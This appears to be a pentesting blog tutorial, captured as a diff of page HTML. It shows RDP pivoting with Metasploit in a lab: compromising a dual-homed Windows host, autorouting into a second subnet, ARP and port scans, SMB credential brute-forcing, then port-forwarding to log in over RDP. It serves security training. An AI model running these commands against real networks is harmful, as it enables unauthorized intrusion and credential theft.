@@ -1,0 +1,76 @@
+<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
+<div class="post-content">
+            <div class="post-cats">
+                <span class="cat-links"><a href="https://www.hackingarticles.in/category/penetration-testing/" rel="category tag">Penetration Testing</a></span>            </div>
+            <h1 class="post-title entry-title">RDP Pivoting with Metasploit</h1>            <div class="post-date">
+                                    <div class="entry-meta">
+                        <span class="posted-on"><a href="https://www.hackingarticles.in/rdp-pivoting-metasploit/" rel="bookmark"><time class="entry-date published" datetime="2017-09-15T14:22:54+00:00">September 15, 2017</time><time class="updated" datetime="2025-05-12T21:17:44+00:00">May 12, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
+                            </div>
+
+            <div class="content post-excerpt entry-content clearfix">
+                <p><span style="color: #000000;">In our previous tutorial we had discussed on <a href="http://www.hackingarticles.in/ssh-pivoting-using-meterpreter/"><strong>SSH pivoting</strong></a> and today we are going to discuss RDP pivoting.</span></p>
+<p><span style="color: #000000;">From Offensive Security</span></p>
+<p><span style="color: #000000;"><strong>Pivoting</strong> is a technique to get inside an unreachable network with help of pivot (center point). In simple words, it is an attack through which an attacker can exploit that system which belongs to the different network. For this attack, the attacker needs to exploit the main server that helps the attacker to add himself inside its local network and then the attacker will able to target the client system for the attack.</span></p>
+<p><span style="color: #000000;"><strong>Lab Setup requirement:</strong></span></p>
+<p><span style="color: #000000;"><strong>Attacker machine</strong>: Kali Linux</span></p>
+<p><span style="color: #000000;"><strong>Pivot Machine (server)</strong>: window operating system with <strong>two </strong>network interface</span></p>
+<p><span style="color: #000000;"><strong>Target Machine (client)</strong>: window 7 (Allow RDP service)</span></p>
+<p><img decoding="async" src="https://4.bp.blogspot.com/-RXRb9RbKbVM/Wc8_x4SWLiI/AAAAAAAARuE/Ip0TWpJAWboG5Sdk18vW0NQwKSZ3l9vVwCLcBGAs/s1600/rdp.png"/></p>
+<p> </p>
+<p><span style="color: #000000;">Use exploit MS17-010 or multi handler to hack the pivot machine and bypass its UAC to achieve admin privileges.</span></p>
+<pre class="lang:default decode:true">sessions</pre>
+<p><span style="color: #000000;">Hence if you will count then currently attacker has hold 2 sessions, <strong>1<sup>st</sup></strong> for meterpreter shell and <strong>2<sup>nd</sup></strong> for <strong>bypass UAC</strong> of the server.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-QCeXiZBTToo/WbvgVD4XYjI/AAAAAAAARZE/zpRMmmIjYFokMWibv3n0ypXuTV4YyKRJQCLcBGAs/s1600/1.png"/></span></p>
+<p><span style="color: #000000;">Check the network interface through the following command:</span></p>
+<pre class="lang:default decode:true">meterpreter&gt; ifconfig</pre>
+<p><span style="color: #000000;">From the given image you can observe two networks interface in the victim’s system <strong>1<sup>st</sup> </strong>for IP <strong>192.168.0.27 </strong>through which the attacker is connected and <strong>2<sup>nd</sup></strong> for IP <strong>192.168.100.100</strong> through which clients (targets) are connected.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-VLxe-RUbEVE/WbvgVAQxO3I/AAAAAAAARZA/ke4JjxQAz2IXf45-jQJy_tgxIVLAR4GBACLcBGAs/s1600/2.png"/></span></p>
+<p><span style="color: #000000;">Since the attacker belongs to <strong>192.168.0.1</strong> interface and client belongs to <strong>192.168.100.0</strong> interface, therefore, it is not possible to directly make an attack on client network until unless the attacker acquires the same network connection. In order to achieve 192.168.100.0 network attacker need to run the <strong>post exploitation</strong> “autoroute”.</span></p>
+<p><span style="color: #000000;">This module manages session routing via an existing Meterpreter session. It enables other modules to ‘pivot’ through a compromised host when connecting to the named NETWORK and SUBMASK. Autoadd will search a session for valid subnets from the routing table and interface list then add routes to them. The default will add a default route so that all TCP/IP traffic not specified in the MSF routing table will be routed through the session when pivoting.</span></p>
+<pre class="lang:default decode:true">msf &gt; use post/multi/manage/autoroute 
+msf post(autoroute) &gt; set session 2
+msf post(autoroute) &gt; exploit</pre>
+<p><span style="color: #000000;"><strong>Note:</strong> If you had not to bypass UAC you can use session 1 for post exploit.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-K3JDxJ-vSFY/WbvgVwmvK1I/AAAAAAAARZI/YtAna9EbOjoGbXWODsTU5eYN4Z0BSTolQCLcBGAs/s1600/3.png"/></span></p>
+<p><span style="color: #000000;">This Module will perform an ARP scan for a given IP range through a Meterpreter Session.</span></p>
+<pre class="lang:default decode:true">use post/windows/gather/arp_scanner
+msf post(arp_scanner) &gt; set rhosts 192.168.100.100-110
+msf post(arp_scanner) &gt; set session 2
+msf post(arp_scanner) &gt; set threads 20
+msf post(arp_scanner) &gt; exploit</pre>
+<p><span style="color: #000000;"><strong> </strong>Here we found a new IP <strong>192.168.100.103</strong> as shown in the given image. Let’s perform TCP port scan for activated services on this machine.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-V4k4tFjwRdg/WbvgV8_V16I/AAAAAAAARZM/8rnOISQaaSI5Ew4kpwaVyR21K07aYKYBACLcBGAs/s1600/4.png"/></span></p>
+<p><span style="color: #000000;">This module Enumerates open TCP services by performing a full TCP connect on each port. This does not need administrative privileges on the source machine, which may be useful if pivoting.</span></p>
+<pre class="lang:default decode:true">use auxiliary/scanner/portscan/tcp
+msf auxiliary(tcp) &gt; set ports 445,3389
+msf auxiliary(tcp) &gt; set rhosts 192.168.100.103
+msf auxiliary(tcp) &gt; set threads 10
+msf auxiliary(tcp) &gt;exploit</pre>
+<p><span style="color: #000000;">From given you can observe <strong>port 3389 </strong>and <strong>port 445 </strong>are <strong>open </strong>and we know that 3389 is used for RDP and 445 is used for SMB.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-zYYn5tiX8J4/WbvgWGIELfI/AAAAAAAARZQ/cVWDArB2DKECRa3CUE0tDjWruxNJomH6wCLcBGAs/s1600/5.png"/></span></p>
+<p><span style="color: #000000;">This module will test an SMB login on a range of machines and report successful logins. If you have loaded a database plugin and connected to a database this module will record successful logins and hosts so you can track your access.</span></p>
+<pre class="lang:default decode:true">use auxiliary/scanner/smb/smb_login
+msf exploit (smb_login)&gt;set rhosts 192.168.100.103
+msf exploit (smb_login)&gt;set user_file /root/Desktop/user.txt
+msf exploit (smb_login)&gt;set pass_file /root/Desktop/pass.txt
+msf exploit (smb_login)&gt;set stop_on_success true
+msf exploit (smb_login)&gt;exploit</pre>
+<p><span style="color: #000000;"> From the given image you can observe the highlights pentest: 123 has success login.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-bc0mJUGMHG4/WbvgWliZr9I/AAAAAAAARZU/Q5_0FCWg_uEcny5rO_avUUqYtBjRP5bxwCLcBGAs/s1600/6.png"/></span></p>
+<p><span style="color: #000000;">Now Type the following command for port forwarding on localhost.</span></p>
+<pre class="lang:default decode:true">meterpreter&gt; portfwd add –l 3389 –p 3389 –r 192.168.100.103 
+</pre>
+<p><span style="color: #000000;">-l: This is a local port to listen on.</span></p>
+<p><span style="color: #000000;">-p: The remote port to connect on.</span></p>
+<p><span style="color: #000000;">-r:  The remote host address to connect on.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-B-paepTs-zc/WbvgWzkLGNI/AAAAAAAARZY/y5jJX1K5010HpGis32mlua5eDzaegdZWQCLcBGAs/s1600/7.png"/></span></p>
+<p><span style="color: #000000;">Now type the following command to connect RDP client on localhost through port 3389</span></p>
+<pre class="lang:default decode:true">rdesktop 127.0.0.1:3389</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-mGrW6Oj2-lQ/WbvgW7OuCiI/AAAAAAAARZc/AJmHMNK0w6szWXZV_M68zJXpQzphCBM5ACLcBGAs/s1600/8.png"/></span></p>
+<p><span style="color: #000000;">Now it will ask to enter the credential for connecting with RDP client; Enter the combination of username and password you have retrieved from SMB login Exploit.</span></p>
+<p><span style="color: #000000;">If you remembered we have retrieved <strong>pentest: 123</strong> through smb login exploit which we are using for login.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-DEKv_HYkwe0/WbvgXcA1lxI/AAAAAAAARZg/Xpt2OpIa9TM4rGv1yykCNxVbSlD9IPbVwCLcBGAs/s1600/9.1.png"/></span></p>
+<p><span style="color: #000000;"><strong>Wonderful!!</strong> We had successfully exploited the RDP client.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-dDVDd4y8S7Q/WbvgXofWsCI/AAAAAAAARZk/-gkK1moKlFwKzFmlCZbSBErAF1BOc7g5ACLcBGAs/s1600/9.png"/></span></p>
+<p><span style="color: #000000;"><strong>Author</strong>: Aarti Singh is a Researcher and Technical Writer at Hacking Articles an Information Security Consultant Social Media Lover and Gadgets. Contact<a href="https://www.linkedin.com/in/aarti--singh/"><strong> here</strong></a></span></p>
+<div class="yarpp yarpp-related yarpp-related-website yarpp-related-none yarpp-template-thumbnails">
